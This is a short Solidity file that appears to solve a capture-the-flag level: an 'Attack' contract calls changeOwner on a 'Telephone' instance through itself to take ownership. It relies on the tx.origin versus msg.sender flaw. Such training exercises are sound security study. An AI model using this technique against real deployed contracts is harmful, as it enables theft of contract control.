// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level04.sol";

contract Attack {
    function atatatak(address _instance) public {
        Telephone(_instance).changeOwner(msg.sender);
    }
}
